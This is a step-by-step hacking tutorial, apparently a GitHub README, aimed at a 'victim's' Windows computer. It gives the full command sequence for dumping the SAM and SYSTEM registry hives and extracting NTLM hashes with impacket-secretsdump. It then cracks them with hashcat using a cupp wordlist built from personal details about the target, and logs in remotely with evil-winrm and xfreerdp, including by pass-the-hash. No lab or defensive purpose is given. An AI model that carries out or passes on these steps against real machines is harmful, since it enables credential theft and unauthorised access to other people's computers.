# In this tutorial you will learn how to CRACK WINDOWS PASSWORD USING HASH and take the reverse shell on the same network. 

## you will need physical access to the victims computer and the victims must have the admin access.

### run this in victim's computer to get the hash.

STEP 1:  open search bar 

STEP 2:  search regedit

STEP 3:  open registry editor 

STEP 4:  click yes to get the admin privledges

STEP 5:  click HKEY_LOCAL_MACHINE

STEP 6:  now we need the sam and system 

STEP 7:  now open cmd and type 

STEP 8:  reg save HKLM\sam ./sam.save

STEP 9:  reg save HKLM\system ./system.save

STEP 10:  explorer .

STEP 11:  copy both the files in a pendrive and get back to your kali machine


## on kali machine :

STEP 1:  copy both the file on the kali machine 

STEP 2:  cd in the folder where you pasted the file 

STEP 3:  ls

STEP 4:  sudo apt search impacket

STEP 5:  impacket-secretsdump -sam sam.save -system system.save LOCAL

STEP 6:  now you will get the hashes just copy the user hash fore example if 
vicitm's username is test then search in the hash for test and copy the hash 
after the user the you need to copy the third part 
test:1001:asdfijslfhsefhaefhhahfl:COPY THIS PART ONLY::::

STEP 7:  now create a new file and save the hashes in that 

STEP 8:  nano hashes.txt (paste the ahsh in it and save it )





## now we will crack the password using the hash 

### we will use the cupp tool to create password list to crack the password

STEP 1:  cupp

STEP 2:  cupp -i

STEP 3:  now fill all the information to generate the passwords

STEP 4:  sudo hashcat -m 1000 hashes.txt passwordlist.txt

STEP 5:  enter

STEP 6:  if the password list have the password then it will be cracked 
otherwise you have to try another password list.

STEP 7:  if the status shows cracked the just type this command to view the password

STEP 8:  sudo hashcat -m 1000 hashes.txt passwordlist.txt --show



# now we will try to hack the victim computer with or without the password: 

STEP 1:  evil-winrm -i IPADDRESS(VICITM'S IPADDRESS) -U USERNAME(VICITM'S USERNAME) -p password(vicitm)

STEP 1:   evil-winrm -i IPADDRESS(VICITM'S IPADDRESS) -U USERNAME(VICITM'S USERNAME) -H paste the hash 


### TO TAKE THE REMOTE DESKTOP :

STEP 1:  xfreerdp /v:10.70.2.156 /u:username /p:password
type y

STEP 1:  xfreerdp /v:10.70.2.156 /u:username /pth:hash

type y


AND BOOM YOU WILL GET THE SHELL OF VICITM'S DEVICE.






____________________________________________________________________________________________________________________________________________
▶ Name: StromWise

▶ Role: Creator

▶ Location: Unknown

▶ GitHub: https://github.com/stromwise 

▶ Instagram: https://www.instagram.com/stromwise/ 

▶ Facebook: https://www.facebook.com/profile.php?id=100093706328777

▶ Youtube: https://www.youtube.com/channel/UC-tafc0TqgZNnQio8Gj-hjg 

▶ Twitter: https://twitter.com/StromWise 
____________________________________________________________________________________________________________________________________________




